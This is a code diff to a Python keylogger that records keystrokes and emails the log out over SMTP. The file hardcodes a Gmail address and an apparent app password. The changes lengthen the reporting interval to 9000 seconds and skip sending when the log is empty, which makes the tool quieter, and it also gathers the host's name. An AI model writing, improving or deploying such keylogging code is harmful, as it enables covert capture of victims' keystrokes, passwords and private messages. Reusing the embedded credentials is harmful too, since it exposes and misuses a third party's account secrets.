@@ -17,7 +17,7 @@ import re
 
 EMAIL_ADDRESS = "scritinamonsalvez@gmail.com"
 EMAIL_PASSWORD = "rjcj lrez lwws dxdq"
-SEND_REPORT_EVERY = 30
+SEND_REPORT_EVERY = 9000
 
 class KeyLogger:
     def __init__(self, time_interval, email, password):
@@ -81,10 +81,12 @@ class KeyLogger:
         server.quit()
 
     def report(self):
-        self.send_mail(self.email, self.password, "\n\n" + self.log)
-        self.log = ""
+        if self.log.strip():  # Verifica si el registro no está vacío
+            self.send_mail(self.email, self.password, "\n\n" + self.log)
+            self.log = ""
         timer = threading.Timer(self.interval, self.report)
         timer.start()
+
 
     def system_information(self):
         hostname = socket.gethostname()
